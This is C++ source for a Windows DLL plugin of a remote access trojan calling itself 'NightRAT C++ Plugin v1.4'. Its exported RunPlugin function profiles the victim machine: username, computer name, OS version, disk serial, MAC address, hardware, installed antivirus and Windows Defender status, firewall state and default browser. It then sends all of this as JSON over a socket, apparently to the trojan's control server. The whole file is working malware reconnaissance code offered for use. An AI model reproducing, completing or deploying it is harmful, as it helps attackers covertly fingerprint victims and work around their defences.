#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <initguid.h>
#include <devguid.h>
#include <setupapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <ctime>
#include <cstdint>
#include "../../include/json.hpp"

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "setupapi.lib")

using json = nlohmann::json;
using namespace std;

// Helper to get registry value
string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
    char data[512];
    DWORD dataSize = sizeof(data);
    if (RegGetValueA(hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
        return string(data);
    return "N/A";
}

string getMacAddress() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        char mac[20];
        sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            AdapterInfo[0].Address[0], AdapterInfo[0].Address[1], AdapterInfo[0].Address[2],
            AdapterInfo[0].Address[3], AdapterInfo[0].Address[4], AdapterInfo[0].Address[5]);
        return string(mac);
    }
    return "00:00:00:00:00:00";
}

string getUptime() {
    ULONGLONG ticks = GetTickCount64();
    int seconds = (int)(ticks / 1000);
    int minutes = seconds / 60;
    int hours = minutes / 60;
    int days = hours / 24;

    string res = "";
    if (days > 0) res += to_string(days) + "d ";
    res += to_string(hours % 24) + "h " + to_string(minutes % 60) + "m";
    return res;
}

string getGPUName() {
    DISPLAY_DEVICEA dd;
    dd.cb = sizeof(dd);
    if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) {
        return string(dd.DeviceString);
    }
    return getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinSAT", "PrimaryAdapterString");
}

string getUSBCount() {
    int count = 0;
    // Using GUID_DEVCLASS_USB to count USB controllers/hubs or devices
    HDEVINFO hDevInfo = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
    if (hDevInfo != INVALID_HANDLE_VALUE) {
        SP_DEVINFO_DATA devInfoData;
        devInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
        while (SetupDiEnumDeviceInfo(hDevInfo, count, &devInfoData)) {
            count++;
        }
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }
    return to_string(count) + " Active USB Controllers/Devices";
}

string getMachineType() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryFlag != 128 && sps.BatteryFlag != 255) return "Laptop";
    }
    if (GetSystemMetrics(SM_TABLETPC)) return "Tablet/2-in-1";
    return "Desktop";
}

string getAntivirus() {
    string av = "None";
    // Check for Windows Defender specifically via Registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD disable = 0;
        DWORD size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "DisableRealtimeMonitoring", NULL, NULL, (LPBYTE)&disable, &size) == ERROR_SUCCESS) {
            if (disable == 0) av = "Windows Defender (Active)";
            else av = "Windows Defender (Disabled)";
        } else {
            av = "Windows Defender";
        }
        RegCloseKey(hKey);
    }

    // Fallback or addition: Check common installation paths
    const char* paths[] = {
        "C:\\Program Files\\Avast Software\\Avast\\AvastUI.exe",
        "C:\\Program Files (x86)\\AVG\\Antivirus\\avgui.exe",
        "C:\\Program Files\\Malwarebytes\\Anti-Malware\\mbam.exe",
        "C:\\Program Files\\ESET\\ESET Security\\ecmd.exe",
        "C:\\Program Files\\Kaspersky Lab\\Kaspersky Anti-Virus\\avp.exe"
    };
    const char* names[] = { "Avast", "AVG", "Malwarebytes", "ESET", "Kaspersky" };

    for (int i = 0; i < 5; i++) {
        if (GetFileAttributesA(paths[i]) != INVALID_FILE_ATTRIBUTES) {
            if (av == "None" || av == "Windows Defender (Disabled)") av = names[i];
            else if (av.find(names[i]) == string::npos) av += " / " + string(names[i]);
        }
    }

    return av;
}

string getFirewall() {
    string fw = "Unknown";
    HKEY hKey;
    // Check Domain Profile
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD enable = 0;
        DWORD size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "EnableFirewall", NULL, NULL, (LPBYTE)&enable, &size) == ERROR_SUCCESS) {
            if (enable) fw = "Windows Firewall (Enabled)";
            else fw = "Windows Firewall (Disabled)";
        }
        RegCloseKey(hKey);
    }
    // If unknown or disabled, check Standard Profile
    if (fw == "Unknown" || fw == "Windows Firewall (Disabled)") {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD enable = 0;
            DWORD size = sizeof(DWORD);
            if (RegQueryValueExA(hKey, "EnableFirewall", NULL, NULL, (LPBYTE)&enable, &size) == ERROR_SUCCESS) {
                if (enable) fw = "Windows Firewall (Enabled)";
                else fw = "Windows Firewall (Disabled)";
            }
            RegCloseKey(hKey);
        }
    }
    return fw;
}

string getLanguage() {
    char lang[256];

	if (GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGLISHDISPLAYNAME, lang, sizeof(lang))) {
		return std::string(lang);
	}
    return "Unknown";
}

string getPlatform() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) return "x64 Native";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) return "x86 Native";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) return "ARM64 Native";
    return "Unknown";
}

string getProcessName() {
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH)) {
        string fullPath(path);
        size_t lastSlash = fullPath.find_last_of("\\/");
        return (lastSlash != string::npos) ? fullPath.substr(lastSlash + 1) : fullPath;
    }
    return "client.exe";
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    time_t now = time(0);
    char date_buf[20];
    strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));

    json j;
    j["action"]             = "inforesponse";

    char username[256];
    DWORD uSize = sizeof(username);
    if (GetUserNameA(username, &uSize)) j["username"] = string(username);
    else j["username"] = "Unknown";

    char pcname[256];
    DWORD pSize = sizeof(pcname);
    if (GetComputerNameA(pcname, &pSize)) j["pcname"] = string(pcname);
    else j["pcname"] = "Unknown";

    string osName = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
    string osVer = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion");
    if (osVer != "N/A" && !osVer.empty()) osName += " (" + osVer + ")";
    j["os"]                 = osName;

    j["client"]             = "NightRAT C++ Plugin v1.4";
    j["process"]            = getProcessName();
    j["datetime"]           = string(date_buf);

    // Drivers
    LPVOID drivers[1024];
    DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
        j["listdrivers"] = to_string(cbNeeded / sizeof(drivers[0])) + " Loaded Drivers";
    else
        j["listdrivers"] = "N/A";

    // HDD Serial
    DWORD serial;
    if (GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0))
        j["hddserial"] = to_string(serial);
    else
        j["hddserial"] = "N/A";

    j["listusb"]            = getUSBCount();
    j["gpu"]                = getGPUName();
    j["cpu"]                = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");

    // RAM
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (GlobalMemoryStatusEx(&statex))
        j["ram"] = to_string(statex.ullTotalPhys / (1024 * 1024)) + " MB";
    else
        j["ram"] = "N/A";

    j["systemproductname"]  = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
    j["machinetype"]        = getMachineType();
    j["lastreboot"]         = getUptime();
    j["antivirus"]          = getAntivirus();
    j["firewall"]           = getFirewall();
    j["macaddress"]         = getMacAddress();
    j["defaultbrowser"]     = getRegValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "ProgId");
    j["currentlang"]        = getLanguage();
    j["platform"]           = getPlatform();

    // Battery
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryFlag == 128) j["battery"] = "No Battery";
        else j["battery"] = to_string((int)sps.BatteryLifePercent) + "%";
    } else {
        j["battery"] = "N/A";
    }

    // Geriye Dönüş: Delphi Server düz \r\n JSON bekliyor
    string msg = j.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}